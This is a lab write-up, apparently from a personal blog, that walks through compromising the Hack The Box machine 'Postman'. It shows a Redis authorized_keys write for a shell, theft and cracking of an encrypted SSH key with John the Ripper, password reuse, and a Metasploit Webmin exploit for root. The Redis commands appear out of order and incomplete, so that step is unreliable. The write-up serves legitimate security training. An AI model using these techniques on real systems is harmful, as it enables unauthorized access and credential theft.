---
title: HackTheBox - Postman
date: 2021-01-01 01:25:15 +0100
categories: [Hackthebox walkthroughs, Linux, Easy]
tags: [htb-linux-easy, redis, ssh2john, John The ripper, miniserv, webmin, CVE-2019-12840, metasploit, writeup, oscp-prep]
image: https://amirr0r.github.io/assets/img/htb/machines/linux/easy/postman/Postman.png
---

## Foothold

### `nmap` scan

```bash
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Postman-full-port-scan.txt 10.10.10.160
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 (RSA)
|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 (ECDSA)
|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 (ED25519)
80/tcp    open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: The Cyber Geek's Personal Website
6379/tcp  open  redis   Redis key-value store 4.0.9
10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
```

### Apache/2.4.29 (port 80)

![Apache port 80](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/postman/80.png)

![dirb port 80](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/postman/80-dirb.png)

### Miniserv (port 10000)

First we got an error:

![10000 miniserv error](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/postman/10000-miniserv.png)

After adding `10.10.10.160 postman` to `/etc/hosts` we are redirected to:

![webmin](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/postman/10000-webmin.png)

Thanks to [nmap scan](#nmap-scan) we know we're dealing with version **1.910**:

![searchsploit webmin](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/postman/webmin-searchsploit.png)

Unfortunately the metasploit exploit requires credentials.

### Redis 4.0.9 (port 6379)

According to [hacktricks](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#ssh), redis home directory is often `/var/lib/redis/`. Let's try to have a shell:

```bash
$ ssh-keygen -t rsa -f postman_rsa
$ redis-cli -h $TARGET 
10.10.10.160:6379> config set dir /var/lib/redis/.ssh/
OK
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
10.10.10.160:6379> 
$ cat foo.txt | redis-cli -h $TARGET -x set crackit
OK
# Don't know why but I had to do it twice
$ redis-cli -h $TARGET 
10.10.10.160:6379> config set dir /var/lib/redis/.ssh/
OK
10.10.10.160:6379> config set dbfilename "authorized_keys"
OK
10.10.10.160:6379> save
OK
10.10.10.160:6379> 
```

![shell](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/postman/shell.png)

## User (redis)

If we go to the `/home` directory, we see there is a user called Matt.

I tried to list the files that he owns:

![find files owned by Matt](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/postman/find_Matt.png)

The first file `/opt/id_rsa.bak` seems interesting.

We can see it;s an encrypted RSA key:

```bash
$ redis@Postman:/home/Matt$ cat /opt/id_rsa.bak
-----BEGIN RSA PRIVATE KEY-----                     
Proc-Type: 4,ENCRYPTED
#...
```

We can transfer it yo our machine usinh `scp`:

```bash
$ scp -i postman_rsa redis@$TARGET:/opt/id_rsa.bak . 
```

Then we can convert using `ssh2john` and run **JohnTheRipper**:

```bash
$ /usr/share/john/ssh2john.py id_rsa.bak > matt_rsa.john
$ john matt_rsa.john --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 for all loaded hashes
Cost 2 (iteration count) is 2 for all loaded hashes
Will run 12 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
computer2008     (id_rsa.bak)
1g 0:00:00:04 DONE (2021-01-01 01:03) 0.2500g/s 3585Kp/s 3585Kc/s 3585KC/s  0125457423 ..*7¡Vamos!
Session completed
```

`computer2008` is the passphrase!

## User (Matt)

```bash
$ ssh -i id_rsa.bak Matt@$TARGET
Enter passphrase for key 'id_rsa.bak': 
Connection closed by 10.10.10.160 port 22
```

This did'nt work so I tried:

```bash
redis@Postman:~$ su Matt
Password: # computer2008
Matt@Postman:/var/lib/redis$ cd
Matt@Postman:~$ cat user.txt
99108a54ba44c99889199e3e53fdacfe
```

We can log in to **webmin** using Matt's credentials:

![webmin](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/postman/webmin.png)

Therefore we can run the metasploit exploit &darr; 

![msf-webmin](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/postman/msf-webmin.png)
![msf](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/postman/msf.png)

## Root

![webmin](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/postman/root_flag.png)
___

## Useful links

- [6379 - Pentesting Redis](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis)
- [CVE-2019-12840](https://cvedetails.com/cve/CVE-2019-12840/)
- [Webmin 1910 Package Updates Remote Command Execution](https://www.pentest.com.tr/exploits/Webmin-1910-Package-Updates-Remote-Command-Execution.html)